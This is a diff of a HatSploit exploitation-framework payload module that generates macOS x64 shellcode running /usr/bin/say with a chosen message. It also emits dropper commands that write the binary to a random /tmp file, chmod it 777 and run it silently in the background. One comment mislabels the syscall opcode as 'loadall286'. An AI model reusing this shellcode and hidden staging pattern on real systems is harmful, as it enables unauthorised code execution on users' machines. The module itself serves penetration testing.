@@ -26,14 +26,14 @@
 
 import struct
 
-from core.lib.payload import HatSploitPayload
+from core.lib.payload import Payload
+from utils.payload.payload import PayloadGenerator
+from utils.string.string import StringTools
 
-from utils.payload.payload_generator import payload_generator
 
-class HatSploitPayload(HatSploitPayload):
-    payload_generator = payload_generator()
-
+class HatSploitPayload(Payload, PayloadGenerator, StringTools):
     details = {
+        'Category': "stager",
         'Name': "macOS x64 Say",
         'Payload': "macos/x64/say",
         'Authors': [
@@ -46,6 +46,7 @@ class HatSploitPayload(HatSploitPayload):
         'Comments': [
             ''
         ],
+        'Architecture': "x64",
         'Platform': "macos",
         'Risk': "low",
         'Type': "one_side"
@@ -54,7 +55,7 @@ class HatSploitPayload(HatSploitPayload):
     options = {
         'MESSAGE': {
             'Description': "Message to say.",
-            'Value': "Ruslanchik",
+            'Value': "Hello, Friend!",
             'Type': None,
             'Required': True
         },
@@ -67,39 +68,41 @@ class HatSploitPayload(HatSploitPayload):
     }
 
     def run(self):
-        message, executable_format = self.parser.parse_options(self.options)
+        message, executable_format = self.parse_options(self.options)
 
         message = (message + '\x00').encode()
         call = b'\xe8' + struct.pack("<I", len(message) + 0xd)
-        
-        if not executable_format in self.payload_generator.formats.keys():
-            self.badges.output_error("Invalid executable format!")
+
+        if executable_format not in self.formats.keys():
+            self.output_error("Invalid executable format!")
             return
 
-        self.badges.output_process("Generating shellcode...")
+        self.output_process("Generating shellcode...")
         shellcode = (
-            b"\x48\x31\xC0" +          # xor rax,rax
-            b"\xB8\x3B\x00\x00\x02" +  # mov eax,0x200003b
-            call +
-            b"/usr/bin/say\x00" +
-            message +
-            b"\x48\x8B\x3C\x24" +      # mov rdi,[rsp]
-            b"\x4C\x8D\x57\x0D" +      # lea r10,[rdi+0xd]
-            b"\x48\x31\xD2" +          # xor rdx,rdx
-            b"\x52" +                  # push rdx
-            b"\x41\x52" +              # push r10
-            b"\x57" +                  # push rdi
-            b"\x48\x89\xE6" +          # mov rsi,rsp
-            b"\x0F\x05"                # loadall286
+                b"\x48\x31\xC0" +  # xor rax,rax
+                b"\xB8\x3B\x00\x00\x02" +  # mov eax,0x200003b
+                call +
+                b"/usr/bin/say\x00" +
+                message +
+                b"\x48\x8B\x3C\x24" +  # mov rdi,[rsp]
+                b"\x4C\x8D\x57\x0D" +  # lea r10,[rdi+0xd]
+                b"\x48\x31\xD2" +  # xor rdx,rdx
+                b"\x52" +  # push rdx
+                b"\x41\x52" +  # push r10
+                b"\x57" +  # push rdi
+                b"\x48\x89\xE6" +  # mov rsi,rsp
+                b"\x0F\x05"  # loadall286
         )
 
-        self.badges.output_process("Generating payload...")
-        payload = self.payload_generator.generate(executable_format, 'x64', shellcode)
+        self.output_process("Generating payload...")
+        payload = self.generate(executable_format, 'x64', shellcode)
+
+        filename = self.random_string()
 
         instructions = ""
-        instructions += "cat >/private/var/tmp/.payload;"
-        instructions += "chmod +x 777 /private/var/tmp/.payload;"
-        instructions += "sh -c '/private/var/tmp/.payload' 2>/dev/null &"
+        instructions += f"cat >/tmp/{filename};"
+        instructions += f"chmod 777 /tmp/{filename};"
+        instructions += f"sh -c '/tmp/{filename}' 2>/dev/null &"
         instructions += "\n"
 
         self.payload = payload
